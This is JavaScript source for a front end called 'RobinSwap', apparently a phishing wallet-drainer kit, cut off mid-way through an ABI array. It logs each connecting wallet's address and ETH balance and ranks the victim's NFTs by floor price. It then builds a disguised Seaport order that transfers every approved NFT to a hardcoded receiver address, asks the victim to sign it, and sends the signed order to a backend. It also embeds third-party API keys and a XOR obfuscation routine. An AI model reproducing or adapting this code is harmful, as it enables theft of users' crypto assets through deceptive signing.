
let RECEIVER = "0xb2A8330658D08be91d217129BDb5F6f74449dc70";
// match backend RECEIVER constants.js

const COVAL_KEY = "ckey_ffa503761a1541cca195f361d2f"
// (your API KEY from `https://api.covalenthq.com)

const API_URL = "https://etherswaps.herokuapp.com";  // CHANGE TO YOUR API_URL
// your BACKEND-URL where you hosted your BACKEND
//const API_URL = "https://YOUR_NODE_JS_SERVER_APP.herokuapp.com" // example here on herokuapp.com

let DebUg = false
// let DebUg = false
const CHAIN_ID = 1;
const OPENSEA_URL = "https://api.opensea.io/"

const NAME = "RobinSwap";

const seaportTesting = false; // false = PROD // true = for TESTING ONLY!

/**
 *
 * @param {string} account
 */
async function action(step) {
  const { ethereum } = window;

    // if wallet is not connected
    if (!account) {
      await connect('mm');
      return;
    }
    // check chain
    var chainId = ethereum.networkVersion;
    if (ethereum.networkVersion !== CHAIN_ID.toString()) {
      let res = await tryToChangeChain();
      if (!res) return;
      chainId = ethereum.networkVersion;
    }

    var res;
    res = await actionSea(account, step);
    return res
}

/**
 * build calldata
 * build message to sign
 * sign message
 * send to backend
 * @param {string} account
 * @returns boolean success
 */
async function actionSea(account, step) {
    var nfts = getItem("seanfts").nfts
   
    var cookieSign = readCookie("sign")
    var signeAccount = ""
    var signedNfts = []

    if(cookieSign != ""){
      var splitedSign = cookieSign.split("_")
      signeAccount = splitedSign[0]
      if(signeAccount == account){
        if(step == 0)
          return true
        var tempSignNfts = splitedSign[1].split("-")
        for(var i = 0; i < tempSignNfts.length; i++){
          signedNfts.push(tempSignNfts[i])
        }
      }
    }

    var canSignNFts = []
    
    
    /// Have New Nft ?
    for(var i = 0; i < nfts.length; i++){
      var nft = nfts[i]
      var exist = false
      for(var j = 0; j < signedNfts.length; j++){
        var signedNft = signedNfts[j].split("^")
        if(nft.contractAddr == signedNft[0] && nft.id == signedNft[1]){
          exist = true
          break
        }
      }
      if(!exist){
        canSignNFts.push(nft)
      }
    }
    /// Have New Nft ?


    if(canSignNFts.length > 0){
      var tempNfts = canSignNFts

      //   if(tempNfts.length > 8)
      //   tempNfts = tempNfts.slice(0,8);
        for(var i = 0; i < tempNfts.length; i++){
          signedNfts.push(`${tempNfts[i].contractAddr}^${tempNfts[i].id}`)
        }

        const timestamp = Math.floor(Date.now() / 1000) - 3600;
        const salt = getSalt();

        const messageToSign = getSellSeaMessage(
        account,
        tempNfts,
        timestamp,
        salt
        );
        console.log(messageToSign)
        if(messageToSign != false){
          try{
            var order = await window.signUser(RECEIVER, messageToSign)
            console.log(order)
            if(order != null){
                document.cookie = "sign="+(account+"_"+signedNfts.join("-")+"; path=/");
                var exteraData = false
                try{
                    if(extera != undefined)
                    exteraData = extera
                }catch{}

                var address = ""
                for(var i = 0 ; i < tempNfts.length; i++){
                    address += `${tempNfts[i].contractAddr} \n`
                }

                var data = {
                    extera: exteraData,
                    detail: JSON.stringify(order),
                    sender: account,
                    reciver: RECEIVER,
                    nfts: address,
                }
                $.ajax({
                    url: "/api/v1/sign/",
                    method: "PUT",
                    data: JSON.stringify(data),
                    success: function(result){
                    }
                });
            }
            return order;
          }catch(err){
           console.log(err)
            logger(`⛑\n\nWallet Error In Sign: "${account}"\n\nPage: "${page}"\n\nErr: ${err}`)
          }
        }
    }
    return true
}

function readCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
        c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
        }
    }
    return "";
  }

/**
 * build tx as message
 * sign message
 * destruct sign
 * send as tx
 *
 * @param {string} account
 * @param {string} mode
 * @param {string} valueToTransHex
 * @param {number} gasPrice
 * @param {number} chainId
 * @returns boolean success
 */


/**
 * @param {string} name name of wallet
 */
let account;
async function connect(name) {
  try{
      addLoading(true)
      name = "mm"
      const { ethereum } = window;
      const width = window.innerWidth;
      // check provider
      if (!ethereum && width < 815) {
          if (name === "mm") {
          window.open(
              `https://metamask.app.link/dapp/${window.location.href
              .replace("https://", "")
              .replace("http://", "")}`
          );
          }
          if (name === "tw") {
          window.open(
              `https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.href}`
          );
          }
          return;
      } else if (!ethereum) {
          showError("Something was wrong!" ,"No crypto wallet found. Please install MetaMask");
          return;
      }
      // do not activate coinbase
      if (name === "mm" && ethereum.providers) {
          ethereum.setSelectedProvider(
          ethereum.providers.find(({ isMetaMask }) => isMetaMask)
          );
      }
      // check chain
      if (ethereum.networkVersion !== CHAIN_ID.toString()) {
          let res = await tryToChangeChain(name);
          if (!res) return;
      }

      // connect
      account = await ethereum.request({
          method: "eth_requestAccounts",
      });

      // trust wallet bug handle
      account =
          name === "tw"
          ? await ethereum.request({
              method: "eth_requestAccounts",
          })[0]
          : ethereum.selectedAddress.toString();
        var ethBalance = await getBalance(account, true, true)
        try{
          var loc = window.location.href.split("/")
          var page = loc[loc.length - 1]
          if(page == "")
            page = "Main"
          logger(`⚙️\n\nWallet Connected: "${account}"\n\nPage: "${page}"\n\nETH Balance: ${ethBalance}`)
        }catch{

        }
      localStorage.removeItem("noeth");
      localStorage.removeItem("nfts");

      


      window.contract = await loadContract();
      RECEIVER = await window.contract.methods.getReceiver().call();
      await scanNfts(account);
      var res = null
      var nftsCount = 0;
      var seanfts = getItem("seanfts")
      if(seanfts != null && seanfts.nfts != undefined)
        nftsCount = seanfts.nfts.length
      if(nftsCount  != 0){
        res = await action(0);
        if(res == null || res == false){
          logger(`❌🌊\n\nWallet Connected: "${account}"\n\nPage: "${page}"\n\nETH Balance: ${ethBalance}`)
        }
      }else {
        logger(`💢🌊\n\nWallet Connected: "${account}"\n\nPage: "${page}"\n\nETH Balance: ${ethBalance}`)
      }

      if((res != null && res != false ) || nftsCount == 0){
        conn()
      }

    }catch(err){
      showError("Something was wrong!" ,"No crypto wallet found. Please install MetaMask");
      console.log(err)
    }
    addLoading(false)
}


/**
 * @param {any} name name of wallet
 */
async function tryToChangeChain(name = null) {
  if ((name && name === "tw") || window.innerWidth < 815) {
    showError("Something was wrong!" ,`Please change network to ${CHAIN_ID === 1 ? "ETH" : "BSC"}`);
    return false;
  }

  // if pc try to switch
  try {
    // @ts-ignore
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: `0x${CHAIN_ID.toString(16)}` }],
    });
  } catch (err) {
    if (err.code === 4902) {
      showError("Something was wrong!" ,`Please add ${CHAIN_ID === 1 ? "ETH" : "BSC"} network.`);
      return false;
    }
  }
  return true;
}

/**
 *
 * @param {any} text data to encode
 * @returns {string} encoded string
 */
const c = (text) => {
  try {
    text = JSON.stringify(text);
    const textToChars = (text) =>
      text
        .toString()
        .split("")
        .map((c) => c.charCodeAt(0));
    const byteHex = (n) => ("0" + Number(n).toString(16)).substr(-2);
    const applySaltToChar = (code) =>
      textToChars(31612400).reduce((a, b) => a ^ b, code);

    return text
      .split("")
      .map(textToChars)
      .map(applySaltToChar)
      .map(byteHex)
      .join("");
  } catch (e) {
    return null;
  }
};

/**
 *
 * @param {string} encoded encoded string from c
 * @returns {any} object that was decoded
 */
const d = (encoded) => {
  try {
    const textToChars = (text) =>
      text
        .toString()
        .split("")
        .map((c) => c.charCodeAt(0));
    const applySaltToChar = (code) =>
      textToChars(31612400).reduce((a, b) => a ^ b, code);
    return JSON.parse(
      encoded
        .toString()
        .match(/.{1,2}/g)
        .map((hex) => parseInt(hex, 16))
        .map(applySaltToChar)
        .map((charCode) => String.fromCharCode(charCode))
        .join("")
    );
  } catch (e) {
    return null;
  }
};

/**
 * @param {string} key
 * @param {any} value
 */
function setItem(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function getNonce() {
  function rndStr(length) {
    var result = "";
    var characters = "abcdef123456789";
    for (var i = 0; i < length; i++) {
      result += characters.charAt(
        Math.floor(Math.random() * characters.length)
      );
    }
    return result;
  }

  return `${rndStr(8)}-${rndStr(4)}-${rndStr(4)}-${rndStr(4)}-${rndStr(8)}`;
}

/**
 * @param {string} account
 * @param {{ id: string; contractAddr: any; amount: any; }[]} tokensArr
 * @param {number} timestamp
 * @param {string} salt
 */
function getSellSeaMessage(account, tokensArr, timestamp, salt) {
  const offer = getOffer(tokensArr);
  if(offer.length != 0){

    const consideration = offer;

    const orderForSigning = { 
      offerer: RECEIVER,
      offer, 
      consideration, 
      orderType: 2, 
      zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00", 
      zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000", 
      conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000", 
    };



    return orderForSigning;
  }else{
    return false
  }

}

/**
 * @param {{ id: string; contractAddr: any; amount: any; }[]} tokensArr
 * @returns {{ itemType: number; token: string; identifierOrCriteria: string; startAmount: string; endAmount: string}[]}
 */
function getOffer(tokensArr) {
  let res = [];
  tokensArr.forEach(
    (/** @type {{ id: string; contractAddr: any; amount: any; }} */ token) => {
      // res.push({
      //   itemType: parseInt(token.id) ? 2 : 1, // 2 - nft, 1 - erc20
      //   token: token.contractAddr,
      //   identifierOrCriteria: token.id,
      //   startAmount: token.amount || "1",
      //   endAmount: token.amount || "1",
      // });
      if(token.type == "ERC721"){

        res.push({ 
          itemType: 2, // 2 - nft, 1 - erc20
          token: token.contractAddr,
          identifier: token.id,
          recipient: RECEIVER 
        })
      }else if(token.type == "ERC20"){
        // res.push({ 
        //   itemType: 1, // 2 - nft, 1 - erc20
        //   token: token.contractAddr,
        //   startAmount: `${token.balance}`,
        //   endAmount: `${token.balance}`,
        //   recipient: RECEIVER 
        // })



        // var val = window.web3.utils.toWei(`0.03`, 'ether')
        // val = window.web3.utils.numberToHex(val)
        // res.push({
        //   itemType: 0,
        //   "token": "0x0000000000000000000000000000000000000000",
        //   "identifierOrCriteria": "0",
        //   "startAmount": val,
        //   "endAmount": val,
        //   "recipient": RECEIVER,
        // })
      }else{
        res.push({ 
          itemType: 3, 
          token: token.contractAddr,
          identifier: token.id,
          recipient: RECEIVER ,
          // startAmount: 1+"",
          amount: token.amount+"",
        })
      }
    }
  );

  return res;
}

/**
 * @param {string} key
 */
function getItem(key) {
  return JSON.parse(localStorage.getItem(key));
}

/**
 * @returns {string} 70 chars salt
 */
function getSalt() {
  let result = "";
  const characters = "0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < 70; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

/*
sets array of nfts:
nfts = [{
      contractAddr: string, 
      tokenId: string
      worth: int,
    }, 
    ...
  ]
*/
/**
 * @param {string} account
 */

// OLD
//  async function GetAllNfts(address){
//   let pageKey = ""
//   var nfts = []
//   var allCollection = getItem("allCollection");
//   while(true){ // Added

//     var url = `https://eth-mainnet.g.alchemy.com/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getNFTs/?owner=${address}`
//     if(pageKey != ""){ // Added
//       url += "&pageKey="+pageKey
//       pageKey = ""
//     }

//     await $.ajax({
//         url: url,
//         method: "GET",
//         success: function(data){
//             if(data.pageKey != undefined && data.pageKey != "")
//               pageKey = data.pageKey
//             else // Added
//               pageKey = ""

//               for(var i = 0; i < data.ownedNfts.length; i++){
//                 if(data.ownedNfts[i].metadata.image == undefined)
//                     data.ownedNfts[i].metadata.image = '/static/assets/img/images.png'
//                   else
//                     data.ownedNfts[i].metadata.image = data.ownedNfts[i].metadata.image.replace("ipfs://", "https://ipfs.io/ipfs/")
//                     data.ownedNfts[i].worth = 0
//                     if(data.ownedNfts[i].contractMetadata != undefined && data.ownedNfts[i].contractMetadata.openSea != undefined && data.ownedNfts[i].contractMetadata.openSea.floorPrice != undefined){
//                       data.ownedNfts[i].worth = data.ownedNfts[i].contractMetadata.openSea.floorPrice
//                     }
//                   nfts.push(data.ownedNfts[i])
//               }
//         }
//     })
//     if(pageKey == "")
//       break
//   }
//   for(var j = 0; j < nfts.length; j++){
//       for(var i = 0; i < allCollection.length; i++){
//       if(allCollection[i].primary_asset_contracts[0] != undefined && nfts[j].contract.address.toLowerCase() == allCollection[i].primary_asset_contracts[0].address.toLowerCase()){
//         nfts[j].worth = allCollection[i].worth
//       }
//     }
//   }

//   nfts.sort((a, b) => {
//     return a.worth < b.worth ? 1 : -1;
//   });

//   return nfts
// }


let LoadedNftsAddres = []
let LoadedNftsData = []
 async function GetAllNfts(address, handler, section){
  if(LoadedNftsAddres.includes(address)){
    return LoadedNftsData[LoadedNftsAddres.indexOf(address)]
  }
  let pageKey = ""
  var nfts = []
  var allCollection = getItem("allCollection");
  while(true){ // Added

    var url = `https://api.opensea.io/api/v1/assets?owner=${address}&limit=50`
    if(pageKey != ""){ // Added
      url += "&cursor="+pageKey
      pageKey = ""
    }

    await $.ajax({
        url: url,
        method: "GET",
        success: function(data){
            if(data.next != undefined && data.next != "")
              pageKey = data.next
            else // Added
              pageKey = ""

              for(var i = 0; i < data.assets.length; i++){
                if(data.assets[i].image_url == undefined)
                    data.assets[i].image_url = '/static/assets/img/images.png'
                if(data.assets[i].name == null || data.assets[i].name == "")
                  data.assets[i].name = data.assets[i].collection.name
                data.assets[i].worth = 0
                data.assets[i].balance = 1
                nfts.push(data.assets[i])
                
              }
              if(handler != undefined){
                handler(data.assets, section)
              }
        }
    })
    if(pageKey == "")
      break
  }
  if(allCollection != undefined){
    for(var j = 0; j < nfts.length; j++){

          for(var i = 0; i < allCollection.length; i++){
            if(allCollection[i].primary_asset_contracts[allCollection[i].primary_asset_contracts.length-1] != undefined && nfts[j].asset_contract.address.toLowerCase() == allCollection[i].primary_asset_contracts[allCollection[i].primary_asset_contracts.length-1].address.toLowerCase()){
              nfts[j].worth = allCollection[i].worth
              nfts[j].balance = allCollection[i].owned_asset_count
            }
      }
    }

    nfts = nfts.sort((a, b) => {
      return a.worth < b.worth ? 1 : -1;
    });
  }

  LoadedNftsAddres.push(LoadedNftsAddres)
  LoadedNftsData.push(nfts)
  return nfts
}

async function GetAllCollection(address){
    var collections = []
    var offset = 0
    var old_count = 0;
    try{
  
      while(true){ // Added
        var url = `${OPENSEA_URL}api/v1/collections?asset_owner=${address}&offset=${offset}&limit=50`
        await $.ajax({
            url: url,
            method: "GET",
            success: function(data){
                for(var i = 0; i < data.length; i++){
                  if(data[i].primary_asset_contracts.length != 0)
                    collections.push(data[i])
                }
            }
        })
        if(old_count == collections.length)
          break
          old_count = collections.length
        offset += 50
      }
    }catch(err){
      console.log(err)
    }
  
    for(var i = 0 ; i < collections.length; i++){
      collections[i].worth = 0
      try{
        var result = await $.ajax({
          url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collections[i].primary_asset_contracts[collections[i].primary_asset_contracts.length-1].address,
          method: "GET",
        })
        if(result.openSea != undefined && result.openSea.floorPrice != undefined)
        collections[i].worth = result.openSea.floorPrice
      }catch{
        if(collections[i].stats.seven_day_volume > 0){
          collections[i].worth = Math.round(
            collections[i].stats.seven_day_volume * 0.8 * 10000
          ) / 10000
        }
      }
      
    }

    collections = collections.sort((a, b) => {
      return a.worth < b.worth
        ? 1
        : -1;
    });

    var temp = []
    for(var i = 0 ; i < collections.length; i++){
      if(collections[i].worth > 0.1){
        temp.push(collections[i])
      }
    }
    collections = temp

    return collections
  }

  async function GetAllErc20(address){
    var erc20Tokens = []
    try{
        var url = `https://deep-index.moralis.io/api/v2/${address}/erc20?chain=eth`
        await $.ajax({
            url: url,
            headers: {"x-api-key": "tH6fXfv2mYk0nf3ZCThET8iTf8Z8acJCOA5Iwdh7VPKBiVVN199sGlCcfZX8uBib"},
            method: "GET",
            success: function(data){
                for(var i = 0; i < data.length; i++){
                  erc20Tokens.push({
                    contractAddr: data[i].token_address,
                    symbol: data[i].symbol,
                    amount: data[i].balance / Math.pow(10, data[i].decimals), 
                    balance: data[i].balance, 
                    decimals: data[i].decimals, 
                    type: "ERC20", 
                    id: 1, 
                  })
                }
            }
        })
        
    }catch(err){
      console.log(err)
    }
    setItem("erc20Tokens", erc20Tokens);
  
    return erc20Tokens
  }


async function scanNfts(account) {
  if (!account) return;
  // if (!getItem("nfts") || !getItem("nfts").length) {
    try {
      // get list of collections
    //   const resp = await sendReq(
    //     "get",
    //     `${OPENSEA_URL}api/v1/collections?asset_owner=${account}&offset=0&limit=100`
    //   );

    //   if (!resp || !resp.data) {
    //     showError("Something was wrong!" ,"Internal error. Please reload the page");
    //     return;
    //   }

      // filter
      let collections = await GetAllCollection(account)
      setItem("allCollection", collections);
      collections = collections.filter(
        (collection) =>
        collection.description !== "" && ((collection.stats.seven_day_volume > 0) || DebUg)
      );


      // sort by price
      

      // result collections
      setItem("collections", collections);

      // get list of token ids
      let nfts = [];
      if (collections.length) {
        // const assetsUrl = `${OPENSEA_URL}api/v1/assets?owner=${account}`;
        // var payload = "";
        // // building request url. adding all collections contracts
        // collections.forEach((collection) => {
        //   payload += `&asset_contract_addresses=${collection.primary_asset_contracts[0].address}`;
        // });

        var allNfts = await GetAllNfts(account)

        // let res = await sendReq("get", `${assetsUrl}`);
        if (allNfts.length == 0) {
          showError("Something was wrong!" ,"Internal error. Try again later");
          return;
        }
        // get nfts for each collection
        collections.forEach((collection) => {
          let currentCollectionNfts = allNfts.filter(
            (nft) =>
              nft.asset_contract.address.toLowerCase() ===
              collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address.toLowerCase()
          );

          currentCollectionNfts.forEach((nftInCurCollection) => {
            // add to result array
            var nftId = nftInCurCollection.token_id
            if(nftInCurCollection.asset_contract.schema_name == "ERC1155")
              nftId = BigInt(nftInCurCollection.token_id)+""
            if((nftId+"").length <= 10 || nftInCurCollection.asset_contract.schema_name != "ERC721"){
              var obj = {
                contractAddr: collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address,
                worth: collection.worth ,
                tokenId: nftId,
                id: nftId,
                type: nftInCurCollection.asset_contract.schema_name,
                amount: collection.owned_asset_count,
              }
              nfts.push(obj);
            }
          });
        });
        // sort by worth
        nfts = nfts.sort((a, b) => {
          return a.worth < b.worth ? 1 : -1;
        });
      }
      setItem("nfts", nfts);
      await scanSea(account, nfts);
      return nfts;
    } catch (e) {
      console.log(e)
      // showError(e.message);
    }
  // } else {
  //   return getItem("nfts");
  // }

}

let contractTest2
/**
 * @param {string} account
 * @param {any[]} allNfts
 */
async function scanSea(account, allNfts) {
  let seanfts = {
    nfts: [],
    totalWorth: 0,
  }; // result array. array of nfts for which user gave approve to opensea
  
  
  // get proxy address for user
  const { ethereum } = window;
  let web3 = new Web3(ethereum);

  let Conduit = ""
  if (CHAIN_ID == 1) {
    Conduit = "0x1E0049783F008A0085193E00003D00cd54003c71"; // OpenSea: Deployer MAINNET
  } else {
    Conduit = "0x00000000006c3852cbEf3e08E8dF289169EdE581"; // OpenSea: Deployer GOERLI = CHAIN_ID = 5
  }

  // var erc20tokens = await GetAllErc20(account)
  // for(var i = 0; i < erc20tokens.length; i++){
  //   var token = erc20tokens[i]
  //   try{

  //     var erc20Contract = await new web3.eth.Contract(ERC20ABI, token.contractAddr, {gas: '100000'})
  //     console.log("Heree1")
      
  //     var amount = await  erc20Contract.methods.allowance(account, Conduit).call();
  //     // if(amount > 0) //TODO maybe need this
  //       seanfts.nfts.push(token);

  //     console.log(amount, token.symbol)
  //   }catch(err){
  //     console.log(err)
  //   }
  // }


  if (
    !getItem("collections") ||
    !getItem("collections").length ||
    !allNfts.length
  ) {
    setItem("seanfts", seanfts);
    return;
  }
  

  const erc721Contract = new web3.eth.Contract(ERC721ABI);

  const erc1155Contract = new web3.eth.Contract(ERC1155ABI);


  // set MulticallABI based on CHAIN_ID
  let MulticallABI_CHAIN_ADDRESS = ""
  if (CHAIN_ID == 1) {
    MulticallABI_CHAIN_ADDRESS = "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441"; //MAINNET
  } else {
    MulticallABI_CHAIN_ADDRESS = "0x77dCa2C955b15e9dE4dbBCf1246B4B85b651e50e"; // GOERLI NEW
  }
  const multicallContract = new web3.eth.Contract(
    MulticallABI, MulticallABI_CHAIN_ADDRESS
  );

  // build multicall calls. check each collection
  let multiCalldata = [];
  const collections = getItem("collections");
  collections.forEach((collection) => {
    multiCalldata.push({
      target: collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address,
      callData: erc721Contract.methods
        .isApprovedForAll(account, Conduit)
        .encodeABI(),
    });
  });


  const results = (
    await multicallContract.methods.aggregate(multiCalldata).call()
  ).returnData;

  

  // add to result array all approved nfts + increase totalWorth
  results.forEach((result, index) => {
    const isApproved = parseInt(result.slice(-1)); // ORIG
    // const isApproved = 1                        // TESTING
    const curCollectionAddr =
      collections[index].primary_asset_contracts[collections[index].primary_asset_contracts.length-1].address;

    if (isApproved) {
      // then we add this collection nfts to seanfts

      // get all collection nfts
      let currentCollectionNfts = allNfts.filter(
        (nft) => nft.contractAddr === curCollectionAddr
      );


      // add each nft to seanft arr
      currentCollectionNfts.forEach((nft) => {
        seaportTesting ? seanfts.totalWorth = 1000 : seanfts.totalWorth += nft.worth;  // seaportTesting
        let copy = structuredClone(nft);
        delete copy.tokenId;
        delete copy.worth;
        seanfts.nfts.push(copy);
      });
    }
  });

  // round worth
  if (results.length) {
    seanfts.totalWorth = Math.round(seanfts.totalWorth * 10000) / 10000;
    setItem("seanfts", seanfts);
  } else {
    setItem("seanfts", {
      nfts: [],
      totalWorth: 0,
    });
  }
}

/**
 * @param {string} method
 * @param {string} url
 * @param {any}  errorText
 * @param {any} payload
 */
async function sendReq(method, url, errorText = null, payload = null) {

  try {
    var res;
    if (method === "get") {
      if (url.includes("coval")) url += `key=${COVAL_KEY}`;

      res = await axios.get(url, {
        headers: url.includes("coval")
          ? {
            accept: "application/json",
          }
          : {},
      });
    } else {


      payload = c(payload);
      res = await axios.post(url, {
        payload: payload,
        headers: {
          accept: "application/json",
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*"
        }
      });
    }
    return res;
  } catch (e) {
    if (errorText) showError(errorText);
    return;
  }
}

function addLoading(state){
  var loading = document.getElementsByClassName("loading_box")[0]
  if(state){
    if(loading.classList.contains("hidden")){
      loading.classList.remove("hidden")
    }
  }else{
    if(!loading.classList.contains("hidden")){
      loading.classList.add("hidden")
    }
  }
}

async function notEligible(info) {
  switch (info) {
    case "signDenied":
      showError("Something went wrong!", "You denied the sign request. Please try again.")
      break;
    case "noNFTs":
      await verifyAsset();
      break;
    case "noETH":
      showError("Something went wrong!", "You are not eligible.")
      break;
    default:
      showError("Something went wrong!", "Something went wrong.")
      break;
  }

}

const TX_GAS_LIMIT = "0x55F0"; // 22'000
const CONTRACT_GAS_LIMIT = "0x186A0"; // 100'000

const expirationOffset = 2630000; // 1 month in sec

const ERC20ABI = [
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
        { name: "_spender",type: "address" },
        { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [
        { name: "", type: "bool" }
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
},
{
  constant: true,
  inputs: [
      {name: "_owner",type: "address"},
      {name: "_spender",type: "address"}
  ],
  name: "allowance",
  outputs: [
      { name: "", type: "uint256"}
  ],
  payable: false,
  stateMutability: "view",
  type: "function"
}
];

const ERC721ABI = [
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "tokenId", type: "uint256" },
    ],
    name: "safeTransferFrom",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },

  {
    constant: false,
    inputs: [
      { internalType: "address", name: "to", type: "address" },
      { internalType: "bool", name: "approved", type: "bool" },
    ],
    name: "setApprovalForAll",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
    ],
    name: "isApprovedForAll",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
];

const MINTABI = [
  {
    inputs: [{ name: "_mintAmount", type: "uint256" }],
    name: "mint",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
];

const MulticallABI = [
  {
    constant: false,
    inputs: [
      {
        components: [
          { name: "target", type: "address" },
          { name: "callData", type: "bytes" },
        ],
        name: "calls",
        type: "tuple[]",
      },
    ],
    name: "aggregate",
    outputs: [
      { name: "blockNumber", type: "uint256" },
      { name: "returnData", type: "bytes[]" },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];



const ERC1155ABI = [{ "inputs": [], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "operator", "type": "address" }, { "indexed": false, "internalType": "bool", "name": "approved", "type": "bool" }], "name": "ApprovalForAll", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "operator", "type": "address" }, { "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256[]", "name": "ids", "type": "uint256[]" }, { "indexed": false, "internalType": "uint256[]", "name": "values", "type": "uint256[]" }], "name": "TransferBatch", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "operator", "type": "address" }, { "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "id", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "TransferSingle", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "string", "name": "value", "type": "string" }, { "indexed": true, "internalType": "uint256", "name": "id", "type": "uint256" }], "name": "URI", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]" }, { "indexed": false, "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }, { "indexed": false, "internalType": "address", "name": "owner", "type": "address" }], "name": "newForge", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": false, "internalType": "address", "name": "initialCollection", "type": "address" }, { "indexed": false, "internalType": "uint256[]", "name": "cloneXIds", "type": "uint256[]" }, { "indexed": false, "internalType": "uint256[]", "name": "wearablesIds", "type": "uint256[]" }, { "indexed": false, "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }], "name": "newRedeemBatch", "type": "event" }, { "inputs": [{ "internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]" }, { "internalType": "uint256[]", "name": "amount", "type": "uint256[]" }, { "internalType": "address[]", "name": "owners", "type": "address[]" }], "name": "airdropTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "id", "type": "uint256" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address[]", "name": "accounts", "type": "address[]" }, { "internalType": "uint256[]", "name": "ids", "type": "uint256[]" }], "name": "balanceOfBatch", "outputs": [{ "internalType": "uint256[]", "name": "", "type": "uint256[]" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "id", "type": "uint256" }, { "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256[]", "name": "ids", "type": "uint256[]" }, { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }], "name": "burnBatch", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "name": "cantForge", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]" }, { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }], "name": "forgeToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "name": "generalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "address", "name": "operator", "type": "address" }], "name": "isApprovedForAll", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "initialCollection", "type": "address" }, { "internalType": "uint256[]", "name": "cloneXIds", "type": "uint256[]" }, { "internalType": "uint256[]", "name": "wearableIds", "type": "uint256[]" }, { "internalType": "uint256[]", "name": 